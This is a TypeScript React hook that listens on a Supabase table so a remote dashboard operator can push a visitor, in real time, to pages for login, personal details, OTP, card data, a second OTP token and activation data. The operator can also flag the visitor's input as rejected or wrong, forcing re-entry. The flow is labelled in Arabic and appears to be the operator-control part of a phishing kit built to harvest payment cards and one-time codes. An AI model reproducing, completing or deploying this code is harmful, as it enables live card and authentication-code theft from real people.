import { useEffect, useRef } from "react";
import { useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";

const redirectMap: Record<string, string> = {
  "تسجيل الدخول": "/login",
  "المعلومات الشخصية": "/personal-info",
  "OTP": "/otp",
  "بيانات البطاقة": "/card-data",
  "OTP Token": "/otp2",
  "الرسالة": "/confirm-order",
  "بيانات التفعيل": "/activation-data",
  "الانتظار": "/waiting",
  "صفحة الانتظار": "/waiting",
  "النجاح": "/success",
};

export function useAdminRedirect(userId: string | null, options?: { approveRedirect?: string }) {
  const navigate = useNavigate();
  const processedRef = useRef<string | null>(null);

  useEffect(() => {
    if (!userId) return;
    processedRef.current = null;

    const handleTabs = async (tabs: Record<string, string> | null) => {
      if (!tabs?.action || tabs.processed === "true") return;
      // Prevent processing the same action twice
      const actionKey = tabs.action + (tabs.timestamp || "");
      if (processedRef.current === actionKey) return;
      processedRef.current = actionKey;

      // Mark as processed so dashboard knows it's handled
      await supabase.from("dashboard_users").update({
        status_tabs: { ...tabs, processed: "true" },
      }).eq("id", userId);

      if (tabs.action === "نقل" && tabs.target) {
        const path = redirectMap[tabs.target];
        if (path) navigate(`${path}?uid=${userId}&t=${Date.now()}`, { replace: true });
      } else if (tabs.action === "موافقة" && options?.approveRedirect) {
        navigate(`${options.approveRedirect}?uid=${userId}&t=${Date.now()}`, { replace: true });
      } else if (tabs.action === "رفض" || tabs.action === "بيانات خاطئة") {
        navigate(`${window.location.pathname}?uid=${userId}&rejected=true&t=${Date.now()}`, { replace: true });
      }
    };

    supabase.from("dashboard_users").select("status_tabs").eq("id", userId).maybeSingle().then(({ data }) => {
      if (data?.status_tabs && typeof data.status_tabs === "object" && !Array.isArray(data.status_tabs)) {
        handleTabs(data.status_tabs as Record<string, string>);
      }
    });

    const channel = supabase
      .channel(`admin_redirect_${userId}`)
      .on("postgres_changes", { event: "UPDATE", schema: "public", table: "dashboard_users", filter: `id=eq.${userId}` }, (payload) => {
        handleTabs(payload.new.status_tabs as Record<string, string> | null);
      })
      .subscribe();

    return () => { supabase.removeChannel(channel); };
  }, [userId, navigate, options?.approveRedirect]);
}
